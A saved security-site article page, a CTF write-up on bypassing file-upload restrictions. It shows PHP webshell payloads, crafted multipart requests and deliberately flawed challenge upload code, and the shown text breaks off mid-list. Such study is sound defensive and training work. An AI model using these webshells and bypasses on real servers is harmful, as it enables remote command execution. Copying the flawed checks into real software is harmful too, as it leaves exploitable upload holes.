@@ -1,0 +1,1748 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0,minimum-scale=1.0">
+            <title>对文件上传的一些思考和总结 - 安全客，安全资讯平台</title>
+                <meta name="description" content="最近在 ctf 比赛中考察到了很多关于文件上传的知识点，然而文件上传这块知识掌握的不是很好。所以这里总结一下近期 ctf 比赛中遇到的文件上传题目的知识考点和常见思路，并且给出相应的例题。"/>
+                <meta name="keywords"
+              content="安全媒体,安全资讯,安全知识, 安全热点,安全招聘,安全趋势,移动安全,网站安全,终端安全,无线安全,工控安全,物联网安全,WEB安全,系统安全,网络安全,区块链安全,安全活动,信息安全,安全预警,安全会议"/>
+        <meta name="csrf-token" content="MsrRHODTCecSeO9ytvfSml2aQFC6kfiUmuEF312F">
+    <link rel="stylesheet" href="https://static.anquanke.com/bootstrap/css/bootstrap.min.css?v1.2">
+    <link rel="stylesheet" href="https://www.anquanke.com/css/style.css?v1.0.28">
+    <link rel="shortcut icon" href="https://p0.ssl.qhimg.com/t01b2a1553a7bc927cb.ico?v=1.2"/>
+    <link href="https://lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script src="https://lib.baomitu.com/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://static.anquanke.com/bootstrap/js/bootstrap.min.js"></script>
+    <script src="https://lib.baomitu.com/axios/0.17.1/axios.min.js"></script>
+    <script src="https://lib.baomitu.com/purl/2.3.1/purl.min.js"></script>
+    <script src="https://lib.baomitu.com/handlebars.js/4.0.11/handlebars.min.js"></script>
+    <script src="https://lib.baomitu.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+    <script src="https://www.anquanke.com/js/site.min.js?v1.0.5"></script>
+    <script src="https://www.anquanke.com/js/xss.min.js?v1.0.0"></script>
+    <script src="https://lib.baomitu.com/jquery.sticky/1.0.4/jquery.sticky.min.js"></script>
+<!--    <script type="text/javascript">-->
+<!--        if (document.location.protocol !== "https:") {-->
+<!--            location.href = location.href.replace(/^http:/, "https:");-->
+<!--        }-->
+<!--        if (document.location.host !== "www.anquanke.com") {-->
+<!--            location.href = location.href.replace(document.location.host, 'www.anquanke.com');-->
+<!--        }-->
+<!--    </script>-->
+</head><body data-spy="scroll" data-target="#article-index" data-offset="30">
+<!--头部导航 -->
+<header>
+    <div class="navbar navbar-dark bg-dark header-navbar fixed-top" style="z-index:100;">
+
+        <div class="container d-flex justify-content-between">
+            <nav class="navbar navbar-expand-lg navbar-dark bg-dark header-navbar">
+                <a href="https://www.anquanke.com" class="navbar-brand">
+                    <img style="height: 48.69px;margin-top: 4px;"
+                         src="https://p0.ssl.qhimg.com/t01dcf171a151ec5398.png">
+                </a>
+                <div class="collapse navbar-collapse" style="margin-left:35px;">
+                    <!--导航菜单-->
+                    <ul class="navbar-nav mr-auto">
+                        <li class="nav-item active header-menu-item">
+                            <a class="nav-link" href="/">首页</a>
+                        </li>
+                        <li class="nav-item dropdown header-menu-item header-nav-item-post">
+                            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button"
+                               data-toggle="dropdown" aria-haspopup="true"
+                               aria-expanded="false">
+                                文章
+                            </a>
+                            <div class="header-pop-window-wrapper">
+                                <div class="header-pop-window">
+                                    <div style="background-color:white;width: 100%;padding-bottom: 15px;">
+                                        <div class="header-pop-menu-container">
+                                            <div class="row">
+                                                <div class="col col-8">
+                                                    <div style="font-weight:bolder;position:relative;font-size:18px;">
+                                                        <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>文章分类
+                                                    </div>
+                                                    <div style="line-height:1.8;font-weight:normal;">
+                                                        <a href="/knowledge">安全知识</a><span class="seprator">|</span>
+                                                        <a href="/news">安全资讯</a><span class="seprator">|</span>
+                                                        <a href="/activity">安全活动</a><span class="seprator">|</span>
+                                                        <a href="/tool">安全工具</a><span class="seprator">|</span><br/>
+                                                        <a href="/job">招聘信息</a>
+                                                    </div>
+                                                </div>
+                                                <div class="col col-6">
+                                                    <div style="font-weight:bolder;position:relative;font-size:18px;">
+                                                        <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>内容精选
+                                                    </div>
+                                                    <div style="line-height:1.8;font-weight:normal;">
+                                                        <a href="/week-list">360网络安全周报</a><span
+                                                                class="seprator">|</span>
+                                                        <a href="/discovery"
+                                                           style="color:red !important;font-weight:bold">安全客季刊</a>
+                                                        <span
+                                                                class="seprator">|</span>
+                                                        <br/>
+                                                        <a href="/subject-list">专题列表</a>
+                                                        <span
+                                                                class="seprator">|</span>
+                                                        <a href="/opensource">开源项目精选</a>
+                                                        
+                                                                
+                                                        
+                                                    </div>
+                                                </div>
+                                                <div class="col col-10">
+                                                    <div style="font-weight:bolder;position:relative;font-size:18px;">
+                                                        <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>热门标签
+                                                    </div>
+                                                    <div style="line-height:1.8;font-weight:normal;">
+                                                                                                                    <a href="/tag/每日安全热点">
+                                                                <nobr>每日安全热点</nobr>
+                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/漏洞分析">
+                                                                <nobr>漏洞分析</nobr>
+                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/网络安全热点">
+                                                                <nobr>网络安全热点</nobr>
+                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/恶意软件">
+                                                                <nobr>恶意软件</nobr>
+                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/活动">
+                                                                <nobr>活动</nobr>
+                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/CTF">
+                                                                <nobr>CTF</nobr>
+                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/Web安全">
+                                                                <nobr>Web安全</nobr>
+                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/安全漏洞">
+                                                                <nobr>安全漏洞</nobr>
+                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/漏洞">
+                                                                <nobr>漏洞</nobr>
+                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/安全研究">
+                                                                <nobr>安全研究</nobr>
+                                                            </a><span class="seprator">|</span>                                                     </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </li>
+                        <li class="nav-item header-menu-item" style="position: relative">
+                            <a class="nav-link" href="/vul">漏洞</a>
+                        </li>
+                        <li class="nav-item header-menu-item">
+                            <a class="nav-link" href="/src">SRC导航</a>
+                        </li>
+                        <li class="nav-item header-menu-item">
+                            <a class="nav-link" href="/discovery">内容精选</a>
+                        </li>
+                    </ul>
+                    <!--搜索-->
+
+                </div>
+            </nav>
+            <div class="hide-in-mobile-device">
+                <div style="float: left;height: 42px;line-height: 42px;margin-top: 11px;">
+                    <fieldset>
+                        <div class="search-form" style="height: 42px;background-color: #1da29b;border: 2px #008c88 solid;display: block;">
+                            <input class="search-input" placeholder="输入关键词搜索" name="s" id="search" value="" style="height:32px;padding-left: 12px;" type="text">
+                            <i onclick="if($('#search').val())window.location.href = '/search?s=' + $('#search').val();"
+                               class="fa fa-search" style="font-size:20px;color:#1dada7"></i>
+                        </div>
+                    </fieldset>
+                </div>
+                <div style="float: left;height: 64px;line-height: 64px;">
+                    <a href="/app"> <img src="https://p0.ssl.qhimg.com/t01452b56d48d4d6d9a.png"
+                                         style="height: 28px;margin-right: 3px;margin-left: 6px;"/><span
+                                style="color: white;font-size: 12px;margin-right: 12px;">APP</span></a>
+                    <!--投稿按钮-->
+                </div>
+                <div style="float: left;height: 64px;line-height: 64px;margin-right: 20px;">
+                    <button onclick="if(getLocalUserInfo()){if(getLocalUserInfo().isLogin)window.location.href='/contribute/new';else window.location.href='/login';}"
+                            type="button" class="btn btn-primary btn-md" style="margin-right:8px;">
+                            <span style="font-size:14px">
+                                <i class="fa fa-pencil-square-o" style="margin-right:4px;"></i> 我要投稿</span>
+                    </button>
+                </div>
+                <div id="login-button" class="hide-in-mobile-device" style="display:none;float: left">
+                <span style="font-size:14px;">
+                        <a href="/login">登录</a>|
+                        <a href="/register">注册</a>
+                    </span>
+                </div>
+                <div id="navigation-user-info" class="hide-in-mobile-device" style="display:none;float: left;">
+                    <a style="position: relative;">
+                        <img class="avatar" id="user-avatar" style="width:40px;height:40px;">
+                        <div style="background-color: red;height: 6px;width: 6px;border-radius: 50%;position: absolute;right: -10px;top:-6px;display: none;" class="unread_count"></div>
+                    </a>
+
+                    <div class="user-opition-menu">
+                        <ul>
+                            <li>
+                                <a id="my-home-page" href="#">
+                                    <i style="margin-right: 6px; color: rgb(29, 173, 167);"
+                                       class="fa fa-user-o"></i>个人主页</a>
+                            </li>
+                            <li style="vertical-align: middle;display: table-cell;">
+                                <a id="my-home-page" href="/setting?p=message" style="vertical-align: middle;">
+                                    <i style="margin-right: 6px; color: rgb(29, 173, 167);"
+                                       class="fa fa-bell-o"></i>我的消息</a><span class="badge badge-pill badge-danger unread_count" id="unread_count"
+                                                                              style="font-size: 11px;margin-left: 6px;vertical-align: middle;display: none"></span>
+                            </li>
+                            <li>
+                                <a href="/setting">
+                                    <i style="margin-right: 6px; color: rgb(29, 173, 167);"
+                                       class="fa fa-cog"></i>资料设置</a>
+                            </li>
+                            <li onclick="logout();">
+                                <i style="margin-right: 8px; color: red;margin-left: 8px;" class="fa fa-power-off"></i>退出登录
+                            </li>
+                        </ul>
+                    </div>
+
+                </div>
+            </div>
+
+            <div class="show-in-mobile-device"
+                 onclick="switchMobileMenu()"
+                 style="width: 40px;height: 60px;line-height: 60px; cursor: pointer;font-size: 28px;color: white">
+                <i class="fa fa-bars"></i>
+            </div>
+        </div>
+    </div>
+</header>
+<style>
+    #mobile-menu {
+        position: fixed;
+        width: 100%;
+        top: 60px;
+        left: 0;
+        background: #1dada7;
+        height: 0;
+        z-index: 50;
+        overflow: hidden;
+        box-shadow: 0 0 3rem #444;
+    }
+
+    #mobile-menu ul {
+        padding: 0px;
+    }
+
+    #mobile-menu li {
+        color: rgba(255, 255, 255, 0.7);
+        font-size: 0.9rem;
+        margin-top: 20px;
+        padding-left: 12px;
+    }
+</style>
+<div id="mobile-menu" class="show-in-mobile-device">
+    <ul>
+        <li class="mobile-menu-item" data-url="/">首页</li>
+        <li class="mobile-menu-item" data-url="/knowledge">安全知识</li>
+        <li class="mobile-menu-item" data-url="/news">安全资讯</li>
+        <li class="mobile-menu-item" data-url="/job">招聘信息</li>
+        <li class="mobile-menu-item" data-url="/activity">安全活动</li>
+        <li class="mobile-menu-item" data-url="/app">APP下载</li>
+    </ul>
+</div>
+<script>
+    var menuExpand = false;
+
+    function switchMobileMenu() {
+        if (!menuExpand) {
+            $("#mobile-menu").animate({"height": "265px"});
+            menuExpand = true;
+        }
+        else {
+            $("#mobile-menu").animate({"height": "0px"});
+            menuExpand = false;
+        }
+    }
+
+    $(".mobile-menu-item").click(function () {
+        window.location.href = $(this).data("url");
+    });
+</script>
+
+<script>
+    var status;
+
+    function updateLoginStatus(status) {
+        if (status.isLogin) {
+            $("#navigation-user-info").show();
+            $("#user-avatar").attr("src", getResizedQihooImg(status.user.avatar, 90, 90));
+            $("#my-home-page").attr("href", "/member/" + status.user.id);
+            $(".comment-login").show();
+            $(".comment-login .avatar").attr("data-original", getResizedQihooImg(status.user.avatar, 90, 90));
+            $(".comment-login .avatar").lazyload();
+            $(".comment-login a").attr("href", "/member/" + status.user.id);
+            $(".comment-login .nickname").text(status.user.nickname);
+            $(".comment-not-login").hide();
+        }
+        else {
+            $("#login-button").show();
+            $(".comment-login").hide();
+            $(".comment-not-login").show();
+        }
+    }
+
+    function getMessageCount() {
+        axios.post(api("msg/user/unread")).then(function (res) {
+            if(res.data.code==0)
+            {
+                if(res.data.unread_count>0)
+                {
+                    $(".unread_count").show();
+                    $("#unread_count").text(res.data.unread_count);
+                }
+
+            }
+            console.log(res.data);
+        });
+    }
+    getMessageCount();
+
+    function logout() {
+        axios.post(api("user/logout")).then(function (res) {
+            deleteUserInfo();
+            window.location.href = "/";
+        });
+    }
+
+    $(".header-nav-item-post").hover(
+        function () {
+            $(".header-pop-window-wrapper").css("visibility", "visible");
+            $(".header-pop-window").css("transform", "translate(0,0)");
+        },
+        function () {
+            $(".header-pop-window").css("transform", "translate(0,-100%)");
+            $(".header-pop-window-wrapper").css("visibility", "hidden");
+        });
+    if (!getLocalUserInfo()) {
+        axios.get(api("user/status")).then(function (res) {
+            if (res.status === 200) {
+                saveLocalUserInfo(res.data);
+                updateLoginStatus(getLocalUserInfo());
+            }
+        })
+    }
+    else {
+        updateLoginStatus(getLocalUserInfo());
+    }
+</script>
+<!--头部导航end--><style>
+    .highslide-viewport-size {
+        position: fixed;
+        width: 100%;
+        height: 100%;
+        left: 0;
+        top: 0;
+    }
+</style>
+<script src="https://res.wx.qq.com/open/js/jweixin-1.2.0.js"></script>
+<script src="https://static.anquanke.com/highslide/highslide.js"></script>
+<link rel="stylesheet" type="text/css" href="https://static.anquanke.com/highslide/css/style.css"/>
+<link href="https://lib.baomitu.com/malihu-custom-scrollbar-plugin/3.1.5/jquery.mCustomScrollbar.min.css" rel="stylesheet">
+<script src="https://lib.baomitu.com/malihu-custom-scrollbar-plugin/3.1.5/jquery.mCustomScrollbar.min.js"></script>
+<script src="https://lib.baomitu.com/layer/3.1.1/layer.js"></script><main role="main" style="min-height:1000px;padding-top:76px;">
+    <div class="container d-flex justify-content-between">
+        <div class="row" style="width:100%">
+            <div class="col col-xs-24 col-sm-24 col-md-24 col-lg-18">
+                <div class="common-left-content-container article-detail"
+                     style="background-color:white;overflow:hidden;">
+                    <h1>
+                        对文件上传的一些思考和总结
+                    </h1>
+                    <p class="article-top-info" style="margin-bottom: 10px;position:relative;">
+                            <span>
+                                阅读量 &nbsp;&nbsp;
+                                <b>248821</b>
+                            </span>
+                        <span style="color:#cccccc;margin-left:20px;margin-right:20px;">|</span>
+                        <span>
+                                                            评论
+                                <b>
+                                    <a target="_blank">12</a>
+                                </b>
+                                                                                        &nbsp;&nbsp;稿费
+                                <b>
+                                    <a target="_blank" style="color:rgb(255, 103, 0) !important; ">300</a>
+                                </b>
+                                                        </span>
+                    <div class="hide-in-mobile-device"
+                         style="padding:6px 12px;; position:absolute;top:90px; right:0px;line-height:40px;overflow:hidden;width:300px;height:40px;">
+                        <div style="background-color:#f2f2f2;transform:skew(30deg);height:45px;width:100%;top:0;right:-30;position:absolute;z-index:0"></div>
+                        <div style="height:40px;width:100%;top:-3px;right:-35px;position:absolute;z-index:0;padding-top: 2px;">
+                            <div class="bdsharebuttonbox" data-tag="share_1"
+                                 style="display:table-cell;vertical-align:midlle;">
+                                        <span style="
+                                                    font-weight: 800;
+                                                    color: #999999;
+                                                ">分享到：</span>
+                                <img data-cmd="qzone" alt="QQ空间"
+                                     src="https://p0.ssl.qhimg.com/sdm/28_28_100/t014ba42aad7714178d.png"/>
+                                <img data-cmd="tsina" alt="新浪微博"
+                                     src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01f0d8694dda79069d.png"/>
+                                <img data-cmd="weixin" alt="微信"
+                                     src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png"/>
+                                <img data-cmd="sqq" alt="QQ"
+                                     src="https://p0.ssl.qhimg.com/sdm/28_28_100/t010d95bee6ba3edf60.png"/>
+                                <img data-cmd="fbook" alt="facebook"
+                                     src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01a5e75c16cffcb0ba.png"/>
+                                <img data-cmd="twi" alt="twitter"
+                                     src="https://p0.ssl.qhimg.com/sdm/28_28_100/t01fc30c819f51e9cff.png"/>
+                            </div>
+                        </div>
+                    </div>
+                    </p>
+                    <time class="article-date">发布时间：2018-11-20 16:05:01</time>
+                                                            <div class="article-content">
+                        <html>
+<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head>
+<body>
+<p><img class="alignnone size-full wp-image-164777 aligncenter" alt="" width="658" height="298" data-original="https://p4.ssl.qhimg.com/t01117e245609d26661.png"></p>
+<p> </p>
+<h2 name="h2-0" id="h2-0">前言</h2>
+<p>最近在 ctf 比赛中考察到了很多关于文件上传的知识点，然而文件上传这块知识掌握的不是很好。所以这里总结一下近期 ctf 比赛中遇到的文件上传题目的知识考点和常见思路，并且给出相应的例题。</p>
+<p>简单的总结一下常见的思路，再根据自己的经验简单列出近些比赛中的一些上传题的套路。</p>
+<p> </p>
+<h2 name="h2-1" id="h2-1">文件上传的本质</h2>
+<p>文件上传还是归根结底是客户端的 POST 请求，消息主体就是一些上传信息。前端上传页面需要指定 enctype 为 multipart/form-data 或者 Multipart/form-data 才能正常上传文件。</p>
+<pre class="pure-highlightjs"><code class="">&lt;form action='' enctype='multipart/form-data' method='POST'&gt;
+&lt;input type='file' name='file'&gt;
+&lt;/form&gt;</code></pre>
+<blockquote><p>multipart 格式的数据会将一个表单拆分为多个部分（part），每个部分对应一个输入域。在一般的表单输入域中，<br>
+它所对应的部分中会放置文本型数据，但是如果上传文件的话，它所对应的部分可以是二进制，下面展现了 multipart 的请求体：</p></blockquote>
+<p>filename 字段是必要的，指定了上传时的那个文件的文件名。其他的可有可无</p>
+<pre class="pure-highlightjs"><code class="">Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA
+
+------WebKitFormBoundaryrGKCBY7qhFd3TrwA
+
+Content-Disposition: form-data; name="text"
+
+title
+
+------WebKitFormBoundaryrGKCBY7qhFd3TrwA
+
+Content-Disposition: form-data; name="file"; filename="chrome.png"
+
+Content-Type: image/png
+
+PNG ... content of chrome.png ...
+
+------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</code></pre>
+<p>这里在每个字段之间使用 ———WebKitFormBoundaryxxx 隔开，boundary是一个字符串，用来切分数据。</p>
+<p>这里就和 post 请求一样，可以自己增加参数，就形如下面这样，将参数名放到 name 里，参数值放到下面：</p>
+<pre class="pure-highlightjs"><code class="">------WebKitFormBoundary1PkqXeou9aUAIMHr
+Content-Disposition: form-data; name="filename"
+
+1.php</code></pre>
+<p>那么这里就增加了一个参数 filename = ‘1.php’</p>
+<p> </p>
+<h2 name="h2-2" id="h2-2">基本上传思路的回顾</h2>
+<p>在渗透测试或者 ctf 过程中，遇到文件上传常见的思路无非是尝试绕过一些限制直接上传 shell （脚本文件），最基本的绕过方法有以下几种：</p>
+<h3 name="h3-3" id="h3-3">
+<a name="%E5%89%8D%E7%AB%AF%E7%BB%95%E8%BF%87"></a>前端绕过</h3>
+<p>这里很基础了，直接绕过前端的 js 判断就行了。</p>
+<p>这里举个例子，某某门户系统：</p>
+<p>在后台页面定制处，可以插入背景图片，如果直接插入 shell 就会提示不允许上传。那么这里可以先上传一个 gif 文件，抓包，改后缀名再发包就可以绕过。</p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/gOHWc5s.png"></p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/iT7BWjV.png"></p>
+<p>这只是最简单的前端验证绕过，当然这里还可以在 f12 里直接去掉前端 js 验证。</p>
+<h3 name="h3-4" id="h3-4">
+<a name="MIME"></a>MIME</h3>
+<blockquote>
+<p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型。</p>
+<p>即在传输过程中标记文件类型的一种方法，也就是 HTTP 文件请求头中的 Content-Type 。</p>
+</blockquote>
+<p>简单的上传情况一般是单独验证这个字段值或者有时配合文件后缀名进行验证的。</p>
+<p>这里再举一个 SUCTF 招新赛的一个例子。题目只有一个上传页面，解决这种题目最简单粗暴的方法就是直接将 Content-Type 和后缀名进行组合来爆破。</p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/B8g2W53.png"></p>
+<p>选择两个变量，选择 Cluster bomb 模式，跑一下就出结果了</p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/p8DW8OM.png"></p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/StzRlKW.png"></p>
+<ul>
+<li>这题的 “&lt;?php ?&gt;” 被过滤了，可以使用下面的 payload 进行简单的绕过</li>
+</ul>
+<pre class="pure-highlightjs"><code class="">&lt;script language="php"&gt;
+@system($_GET['c']);
+&lt;/script&gt;</code></pre>
+<h3 name="h3-5" id="h3-5">大写 Multipart</h3>
+<p>即将请求头中的 Content-Type 的 multipart/form-data 第一个字符 m 改成 M，即 Multipart/form-data（不影响传输）</p>
+<p>这里的例子是 bugku 的”求getshell”，同样只有一个上传界面：</p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/NdkgEF8.png"></p>
+<p>burp 抓包，使用上面爆破的方法无效，最后发现是将 multipart 改成 Multipart…这样就成功绕过了</p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/6WpkmWn.png"></p>
+<p>其实这题有点脑洞了。。不过没关系，这里的重点不是这个。</p>
+<p> </p>
+<h2 name="h2-6" id="h2-6">后缀名构造</h2>
+<h3 name="h3-7" id="h3-7">
+<a name="%E6%9E%84%E9%80%A0%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"></a>构造数组绕过</h3>
+<p>最近碰到的两道题，一道是网鼎杯第二场的 wafUpload，一道是上海网安赛的 web3。这两道考点都很类似。但是还是有一些小的差异，我们一道一道来看。</p>
+<p>先看一下 wafUpload 这道题：</p>
+<pre class="pure-highlightjs"><code class="">&lt;?php
+#$sandbox = '/var/www/html/upload/' . md5("phpIsBest" . $_SERVER['REMOTE_ADDR']);
+$sandbox = '';
+
+#@mkdir($sandbox);
+#@chdir($sandbox);
+
+if (!empty($_FILES['file'])) {
+    #mime check
+    if (!in_array($_FILES['file']['type'], ['image/jpeg', 'image/png', 'image/gif'])) {
+        die('This type is not allowed!');
+    }else{
+        echo "pass 1n";
+    }
+
+    #check filename
+    $file = empty($_POST['filename']) ? $_FILES['file']['name'] : $_POST['filename'];
+    if (!is_array($file)) {
+        $file = explode('.', strtolower($file));
+    }
+    $ext = end($file);
+    if (!in_array($ext, ['jpg', 'png', 'gif'])) {
+        die('This file is not allowed!');
+    }else{
+        echo "pass 2n";
+    }
+
+    $filename = reset($file) . '.' . $file[count($file) - 1];
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $sandbox . '/' . $filename)) {
+        echo 'Success!';
+        echo 'filepath:' . $sandbox . '/' . $filename;
+    } else {
+        echo 'Failed!';
+    }
+}
+show_source(__file__);
+?&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;title&gt;Upload Your Shell&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form action="" method="post" enctype="multipart/form-data"&gt;
+    &lt;label for="file"&gt;Filename:&lt;/label&gt;
+    &lt;input type="text" name="filename"&gt;&lt;br&gt;
+    &lt;input type="file" name="file" id="file" /&gt;
+    &lt;input type="submit" name="submit" value="Submit" /&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>审计源码可以知道，代码中用 end 函数取到上传文件的后缀并判断，用 reset 函数返回的值作为文件名</p>
+<p>根据题目，需要绕过两层判断。</p>
+<p>1.第一层，直接抓包修改 MIME 为 image/png 就行了。</p>
+<p>2.第二层，构造 filename 字段为数组</p>
+<p>仔细看 html 代码中提供了一个 filename 字段，在下面这句代码的判断中，会先查看是否有直接 post 提交的 filename 字段，如果有的话就使用这个字段的值（这个就有点类似提示的作用）</p>
+<pre class="pure-highlightjs"><code class="">$file = empty($_POST['filename']) ? $_FILES['file']['name'] : $_POST['filename'];</code></pre>
+<p>在本地复现一下，抓包之后看看：</p>
+<p>抓包重放之后，如果这里 filename 字段我们填上 shell.php ，根据上面的那句代码的判断</p>
+<pre class="pure-highlightjs"><code class="">$file = 'shell.php'</code></pre>
+<p>如果没有在 filename 字段中填入 shell.php 的话，那么</p>
+<pre class="pure-highlightjs"><code class="">$file = '1.php'</code></pre>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/ZT3X8kd.png"></p>
+<p>若直接是这样的话，在下面的几句判断中就无法通过</p>
+<pre class="pure-highlightjs"><code class="">if (!in_array($ext, ['jpg', 'png', 'gif']))</code></pre>
+<p>所以这里想要绕过他的判断直接上传 php 文件的话，只能构造 filename 为数组，通过 end 函数的缺陷来绕过下面的的条件判断。</p>
+<p>那么这个 end 函数的缺陷在哪呢？</p>
+<p>看下面的这个例子:</p>
+<pre class="pure-highlightjs"><code class="">&lt;?php
+
+$arr = array();
+
+$arr[0] = 'first';
+$arr[1] = 'second';
+$arr[2] = 'third';
+
+var_dump($arr);
+
+echo "the result of reset: ".reset($arr)."n";
+
+echo "the result of end: ".end($arr);
+?&gt;</code></pre>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/UOpXffv.png"></p>
+<p>其实 end 函数原本的作用就是返回数组的最后一个元素，在上面看的是正常的。但是如果我们这里把对数组赋值的顺序换一下（先给 arr[2] 赋值），可以看到结果就变了。</p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/VTNZYI4.png"></p>
+<h4 id="h4-u5C0Fu603Bu7ED3">
+<a name="%E5%B0%8F%E6%80%BB%E7%BB%93"></a>小总结</h4>
+<p>总结一下就是 end 函数取到的是给数组的最后一次赋值的那个值，继续尝试会发现 reset 函数也是一样，第一个给数组赋值的值就是 reset 函数返回的值</p>
+<ul>
+<li>例如先给 $arr[2] 赋值，那么 reset 函数返回的就是 $arr[2] 的值</li>
+</ul>
+<p>所以这里我们就可以构造 payload 了。</p>
+<p><img class="aligncenter" alt="" data-original="https://i.imgur.com/3VYdZI7.png"></p>
+<p>这里的 end 函数取到了第二个给数组赋值的值，也就是 filename[0] ，reset 函数的值为 filename[1]。这边构造</p>
+<pre class="pure-highlightjs"><code class="">filename[1] = php
+filename[0] = png</code></pre>
+<p>在后面拼接 $filename 时候，再一次拼接到后缀名，即</p>
+<pre class="pure-highlightjs"><code class="">$filename = reset($file) . '.' . $file[count($file) - 1];</code></pre>
+<p>这里的</p>
+<pre class="pure-highlightjs"><code class="">$file[count($file) - 1]</code></pre>
+<p>一定是取到 filename[1]，所以上面给 filename[1] 赋值为 php 的意义就在这里。</p>
+<p>最后拼接出了 php.php，就达到了上传 shell 的目的。</p>
+<h3 name="h3-8" id="h3-8">
+<a name="%E4%B8%8A%E6%B5%B7%E7%BD%91%E5%AE%89%E8%B5%9B%20web3"></a>上海网安赛 web3</h3>
+<h4 id="h4-u540Eu7F00u540Du6784u9020u7ED5u8FC7u5224u65AD">
+<a name="%E5%90%8E%E7%BC%80%E5%90%8D%E6%9E%84%E9%80%A0%E7%BB%95%E8%BF%87%E5%88%A4%E6%96%AD"></a>后缀名构造绕过判断</h4>
+<p>题目就是一个简单的上传逻辑。</p>
+<pre class="pure-highlightjs"><code class="">&lt;?php
+    error_reporting(0);
+    //$dir=md5("icq" . $_SERVER['REMOTE_ADDR']);
+    //$dir=md5("icq");
+    //$sandbox = '/sandbox/' . $dir;
+    //@mkdir($sandbox);
+    //@chdir($sandbox);
+
+    if($_FILES['file']['name']){
+        $filename = !empty($_POST['file']) ? $_POST['file'] : $_FILES['file']['name'];
+        if (!is_array($filename)) {
+            $filename = explode('.', $filename);
+        }
+        $ext = end($filename);
+        var_dump($ext);
+        if($ext==$filename[count($filename) - 1]){
+            die("emmmm...");
+        }
+        var_dump($filename);
+        $new_name = (string)rand(100,999).".".$ext;
+        move_uploaded_file($_FILES['file']['tmp_name'],$new_name);
+        $_ = $_POST['hehe'];
+        if(@substr(file($_)[0],0,6)==='@&lt;?php' &amp;&amp; strpos($_,$new_name)===false){
+            include($_);
+        }
+        unlink($new_name);
+    }
+    else{
+        highlight_file(__FILE__);
+    }
+?&gt;
+
+&lt;form action="" method="post" enctype="multipart/form-data"&gt;
+    &lt;input type="file" name="file" id="file" /&gt;
+    &lt;input type="submit" name="submit" value="Submit" /&gt;
+&lt;/form&gt;</code></pre>
+<p>可以看到前半段的代码和前面一道是很相似的，都用了 end 函数来处理文件的后缀名。但是这里没有进行图片后缀的判断，而是进行下面的判断：</p>
+<pre class="pure-highlightjs"><code class="">if($ext==$filename[count($filename) - 1]){
+            die("emmmm...");
+        }</code></pre>
+<p>而根据 $filename 的来源</p>
+<pre class="pure-highlightjs"><code class="">$filename = !empty($_POST['file']) ? $_POST['file'] : $_FILES['file']['name'];
+$ext = end($filename);</code></pre>
+<p>我们也可以类似的构造 $_POST[‘file’] ，也就是自己插入一个字段 file ：</p>
+<pre class="pure-highlightjs"><code class="">------WebKitFormBoundarywrXtm4qsIjhjlklR
+Content-Disposition: form-data; name="file[2]"
+
+2.php
+------WebKitFormBoundarywrXtm4qsIjhjlklR
+Content-Disposition: form-data; name="file"; filename="1.php"
+Content-Type: application/x-php
+
+GIF89a&lt;?=eval($_POST['1']);</code></pre>
+<p>若我们只传入一个 file[2] = ‘2.php’， 即 $filename[2] = ‘2.php’， 那么 $ext = ‘2.php’， $filename[count($filename) – 1] = $filename[0]</p>
+<p>因为我们只构造 filename[2]，所以 $filename[0] 为空，两者不相等所以就绕过了上面后缀名的判断。</p>
+<h4 id="h4-unlink-">
+<a name="unlink%20%E7%BB%95%E8%BF%87"></a>unlink 绕过</h4>
+<p>题目后面的代码逻辑是将前面的文件上传到服务器上，之后再用 post 方法接受一个参数作为文件，之后再包含这个文件。</p>
+<p>看到上传文后再 unlink，第一时间想到的肯定是条件竞争的方法。但是对于这道题目，还有很多种方法。</p>
+<p>1./. 符号绕过</p>
+<p>2.目录穿越（把文件上传到想上传的地方，然后再包含相应的文件即可）</p>
